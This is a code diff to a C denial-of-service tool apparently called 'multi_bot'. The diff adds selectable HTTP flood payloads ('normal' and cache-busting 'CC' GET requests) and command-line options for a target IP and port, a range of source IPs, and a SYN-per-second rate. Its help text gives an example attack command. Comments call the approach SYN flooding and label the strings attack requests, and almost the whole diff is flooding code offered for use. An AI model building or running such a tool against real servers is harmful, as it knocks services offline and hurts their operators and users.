@@ -65,6 +65,12 @@ enum thread_state
     ST_BIND
 };
 
+enum http_attack_mode
+{
+    HTTP_NORMAL = 0,
+    HTTP_CC,
+    HTTP_MAX,
+};
 typedef struct _ctx_thread
 {
     int index;
@@ -122,6 +128,7 @@ int conn_rate;
 struct sockaddr_in target;
 
 /* attack requests: */
+#if 0
 #ifdef ATTACK_NORMAL
 static char *req = "GET / HTTP/1.1\r\nAccept: image/gif, image/jpeg, */*\r\n\r\n";
 #endif
@@ -132,6 +139,15 @@ static char *req ="GET / HTTP/1.1\r\nConnection: Close\r\nAccept: */*\r\nUser-Ag
 
 #ifdef ATTACK_CC_HEADER
 static char *req ="GET / HTTP/1.1\r\nConnection: Close\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\ncache-control: no-store, must-revalidate\r\n\r\n";
+#endif
+#else
+static char *attack_payload[] = {
+    // Normal
+    "GET / HTTP/1.1\r\nAccept: image/gif, image/jpeg, */*\r\n\r\n",
+    // Http CC
+    "GET / HTTP/1.1\r\nConnection: Close\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)cache-control: no-store, must-revalidate\r\n\r\n",
+};
+int attack_idx;
 #endif
 
 static char *dev = CLI_DEV;
@@ -526,9 +542,9 @@ void stat(int signum) {
     int ctime=time(NULL);
     printf(" ---- overall statistics ------------------------------------------------\n");
     printf("   packets sent:          %d\n",outcount);
-    printf("   bytes sent:            %d\n",outcount * strlen(req));
+    printf("   bytes sent:            %d\n",outcount * strlen(attack_payload[attack_idx]));
     printf("   seconds active:        %d\n",ctime-starttime);
-    printf("   average bytes/second:  %d\n",(outcount * strlen(req)/(ctime-starttime)));
+    printf("   average bytes/second:  %d\n",(outcount * strlen(attack_payload[attack_idx])/(ctime-starttime)));
     printf("   average packets/second:%d\n",outcount/(ctime-starttime));
     printf("\n");
 
@@ -616,7 +632,7 @@ static void tcp_attack()
         }
 
         /* write */
-        if(ctx_write(fd, req, strlen(req)) < 0) {
+        if(ctx_write(fd, attack_payload[attack_idx], strlen(attack_payload[attack_idx])) < 0) {
             die("write error");// ERROR
         }
 
@@ -748,15 +764,74 @@ static void sighandler(int num)
 }
 #endif
 
+void help()
+{
+    printf(
+            "-m : http attack mode (normal, cc)\n"
+            "-s : attack taget ip address\n"
+            "-p : attack target ip's port\n"
+            "-i : source ip address that is start attack\n"
+            "-n : the number of ip address\n"
+            "-o : the number of port\n"
+            "-x : syn per sec\n"
+            "-d : device name\n"
+            "-h : help message\n"
+            );
+
+    //printf("usage: %s srv_ip srv_port start_ip #ip #port syn/s dev\n", argv[0]);
+    printf("example: multi_bot -m cc -s 18.0.0.1 -p 80 -i 9.1.1.1 -n 100 -o 10 -x 100 -d eth0\n");
+}
+
 int main(int argc, char *argv[])
 {
-    if(argc != 8) {
-        printf("usage: %s srv_ip srv_port start_ip #ip #port syn/s dev\n", argv[0]);
-        printf("example: %s 18.0.0.1 80 9.1.1.1 100 10 100 eth0\n", argv[0]);
+    struct in_addr addr;
+    short j;
+    char *attack_mode = NULL, *src_ip = NULL, *svr_ip = NULL, *svr_port = NULL;
+    int param_opt, i, port_num = 0, ip_num = 0, index = 0;
+
+    while( -1 != (param_opt = getopt(argc, argv, "m:s:p:i:n:o:x:d:h"))) {
+        switch(param_opt) {
+            case 'm':
+                attack_mode = optarg;
+                break;
+            case 's':
+                svr_ip = optarg;
+                break;
+            case 'p':
+                svr_port = optarg;
+                break;
+            case 'i':
+                src_ip = optarg;
+                break;
+            case 'n':
+                ip_num = atoi(optarg);
+                break;
+            case 'o':
+                port_num = atoi(optarg);
+                break;
+            case 'x':
+                ss_max = atoi(optarg);
+                break;
+            case 'd':
+                dev = optarg;
+                break;
+            case 'h':
+            default:
+                help();
+                exit(EXIT_SUCCESS);
+        }
+    }
+    if(!attack_mode || !svr_ip || !svr_port || 
+            !src_ip || !ip_num || !port_num || !ss_max || !dev) {
+        help();
         exit(EXIT_SUCCESS);
     }
 
-    dev = argv[7];
+    if(!strcmp("normal", attack_mode)) {
+        attack_idx = HTTP_NORMAL;
+    } else if(!strcmp("cc", attack_mode)) {
+        attack_idx = HTTP_CC;
+    }
 
     /* CPU clock test (Hz) */
     __u64 test = read_clock();
@@ -767,21 +842,13 @@ int main(int argc, char *argv[])
     // get start time 
     gettimeofday(&g_s_time, NULL);
 
-    struct in_addr addr;
-
-    if(inet_aton(argv[3], &addr) == 0) { //start_ip
-        printf("invalid address: %s\n", argv[3]);
+    if(inet_aton(src_ip, &addr) == 0) {
+        printf("invalid address: %s\n", src_ip);
         exit(EXIT_FAILURE);
     }
 
     /* policy: syn flooding */
-    ss_max = atoi(argv[6]); // syn/s
     ss_quota = ss_max;
-
-    int i, index = 0;
-    short j;
-    int ip_num = atoi(argv[4]); // ip count
-    int port_num = atoi(argv[5]); // port
     thread_num = ip_num * port_num;
 
     /* initialization */
@@ -820,8 +887,8 @@ int main(int argc, char *argv[])
     //char *srv_port = SERV_PORT;
     memset(&srv_addr, 0, sizeof(srv_addr));
     srv_addr.sin_family = AF_INET;
-    srv_addr.sin_addr.s_addr = inet_addr(argv[1]);
-    srv_addr.sin_port = htons(atoi(argv[2]));
+    srv_addr.sin_addr.s_addr = inet_addr(svr_ip);
+    srv_addr.sin_port = htons(atoi(svr_port));
 
     target = srv_addr;  // save to global variable
 
